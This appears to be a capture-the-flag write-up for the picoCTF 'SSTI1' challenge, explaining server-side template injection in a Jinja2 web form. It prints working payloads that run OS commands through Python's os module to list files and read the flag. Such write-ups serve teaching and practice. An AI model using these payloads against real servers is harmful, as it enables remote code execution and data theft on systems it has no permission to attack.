# 🌐 The SSTI1 Challenge 🚩

<img src="https://komarev.com/ghpvc/?username=CTF-isaka&label=Bookmarklet&color=0e75b6&style=flat" align="center" alt="since 19 March, 2025" />

## **Challenge Overview**
The SSTI1 challenge focuses on **Server-Side Template Injection (SSTI)**, a vulnerability that allows attackers to inject and execute arbitrary code on a server through improperly sanitized template engine input.

### **Challenge Screenshot:**

![image](https://github.com/user-attachments/assets/ffb5ca8c-b4b5-479b-995a-a530e43f2542)

---

## **Additional Information**

### **Hints:**
1. The vulnerability revolves around **Server-Side Template Injection (SSTI)**.
2. The input field reflects user input dynamically in a rendered template, making it susceptible to SSTI attacks.

### **Links:**
- http://rescued-float.picoctf.net:57180

---

## **Steps to Solve the Challenge**

### **Step 1: Understanding the Input Mechanism**
After exploring the challenge, we realize that we can input data into a form, and later see the **announcement** of what we entered.

**Example:**
![image](https://github.com/user-attachments/assets/cb960175-dd76-4e5a-9bce-ca20899f1237)
![image](https://github.com/user-attachments/assets/7bb9df3d-0f82-44b3-834e-1592a72aaaf1)


This suggests that the server processes our input and renders it within a template.

---

### **Step 2: Testing for SSTI Vulnerability**

SSTI occurs when user input is **dynamically evaluated by the template engine** without proper sanitization. 

To check if SSTI exists, we test by injecting:
```
{{ 7 + 7 }}
```

If the application is vulnerable, we should see **14** in the response.

![image](https://github.com/user-attachments/assets/84c7e967-92eb-4577-a2be-62b38464ac03)


✅ **Result:** After submitting `{{7+7}}`, the output displays `14`, confirming that the application is vulnerable to SSTI.

---

### **Step 3: Testing for Remote Code Execution (RCE)**

Since SSTI exists, we escalate to **Remote Code Execution (RCE)** to check if we can run system commands.

We inject:
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

![image](https://github.com/user-attachments/assets/9076f1b6-61c4-41d0-a74f-5b041af0f338)

✅ **Result:** The output displays the user information, confirming that we can execute system commands.

---

### **Step 4: Exploring the Server Filesystem**
Now that we have command execution, we attempt to **list the directory contents** to locate the flag file:
```
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

![image](https://github.com/user-attachments/assets/b9571a4a-c991-414c-81d0-2657d0dab1ec)

✅ **Result:** The server lists its contents, revealing a file named **flag**.

---

### **Step 5: Reading the Flag**
Now that we have located the flag file, we extract its contents:
```
{{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}
```

✅ **Result:** The flag is displayed! 🎉

---

## **Conclusion**
This challenge demonstrates how **unsanitized input in template engines** can lead to **SSTI vulnerabilities**, escalating to **RCE and full server compromise**.

### **Key Takeaways:**
✅ **SSTI occurs when user input is rendered in a server-side template.**  
✅ **Testing simple expressions (e.g., `{{7+7}}`) helps confirm SSTI.**  
✅ **RCE can be achieved by injecting system commands through Python's `os` module.**  
✅ **With RCE, we can explore the filesystem, locate, and read the flag.**  

---

🎯 **You’ve successfully completed the SSTI1 Challenge!** 🏆
